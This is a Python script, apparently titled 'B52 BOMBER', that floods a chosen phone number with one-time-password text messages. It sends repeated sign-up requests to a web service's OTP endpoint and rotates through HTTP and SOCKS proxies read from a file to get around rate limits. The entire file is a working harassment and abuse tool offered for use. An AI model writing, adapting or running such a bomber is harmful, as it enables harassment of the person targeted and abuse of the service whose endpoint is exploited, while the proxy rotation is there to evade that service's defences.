import requests
import random
import os
import pyfiglet
from termcolor import colored
import socks
import socket

def print_ascii_art():
    """Print ASCII art and a small text signature."""
    big_text = pyfiglet.figlet_format("B52 BOMBER", font="slant")
    small_text = "made by @k10x"
    
    print(colored(big_text, "cyan"))
    print(colored(small_text, "red"))

def sending_otp(target_number, proxy):
    """Send OTP request using a given proxy."""
    url = "https://services.example.com/api/bloger/cta/push-data"
    
    headers = {
        "Host": "services.example.com",
        "Sec-Ch-Ua": '"Chromium";v="119", "Not?A_Brand";v="24"',
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
        "Sec-Ch-Ua-Platform": '"Linux"',
        "Origin": "https://example.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://example.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i",
        "Connection": "close"
    }

    payload = {
        "source_page": "-",
        "event_to": "MoEngage",
        "ui_name": "GetStarted",
        "cta_name": "cta_GetStart",
        "cta_type": "Sign Up CTA",
        "cta_route": "https://services.example.com/api/bloger/cta/push-data",
        "user_action": "send_otp",
        "record_id": "0",
        "name": "jam",
        "mobile": target_number,
        "otp_1": "",
        "otp_2": "",
        "otp_3": "",
        "otp_4": ""
    }

    ip, port = proxy.split(":")
    port = int(port)
    
    # Check if the port is a SOCKS5 proxy (default to SOCKS5 on port 1080, for example)
    if port == 1080 or port == 9050:  # You can adjust this based on known SOCKS proxy ports
        # SOCKS proxy (using socks library with requests)
        socks.set_default_proxy(socks.SOCKS5, ip, port)
        socket.socket = socks.socksocket
        try:
            response = requests.post(url, headers=headers, data=payload, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"Error with SOCKS proxy {proxy}: {e}")
            return
    else:
        # HTTP/HTTPS proxy
        proxy_url = f"http://{ip}:{port}"
        proxies = {
            "http": proxy_url,
            "https": proxy_url
        }
        try:
            response = requests.post(url, headers=headers, data=payload, proxies=proxies, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"Error with HTTP proxy {proxy}: {e}")
            return

    print(colored(f"Proxy used: {proxy}", "magenta"))
    print(f"Response Code: {response.status_code}")
    print(response.text)

def load_proxies(file_name="proxies.txt"):
    """Load proxies from a text file and return as a list."""
    current_directory = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_directory, file_name)

    proxies = []

    try:
        with open(file_path, "r") as file:
            for line in file:
                line = line.strip()
                if line:
                    proxies.append(line)
    except FileNotFoundError:
        print(colored(f"Error: {file_name} not found!", "red"))
        exit(1)
    
    return proxies

def main():
    """Main function to interact with the user and send OTP requests."""
    print_ascii_art()

    # Load proxies from the proxies.txt file
    proxies = load_proxies()

    if not proxies:
        print(colored("No proxies found in the file.", "red"))
        return

    # Get target number and number of OTPs to send
    target_number = input(colored("[+]Enter target number without '+91': ", "magenta"))
    try:
        how_many_times = int(input(colored("[+]How many OTPs do you want to send: ", "magenta")))
    except ValueError:
        print(colored("Invalid number entered for OTP count. Please enter an integer.", "red"))
        return

    # Send OTPs
    for i in range(how_many_times):
        proxy = random.choice(proxies)
        print(f"Sending OTP #{i + 1} using proxy {proxy}...")
        sending_otp(target_number, proxy)

if __name__ == "__main__":
    main()
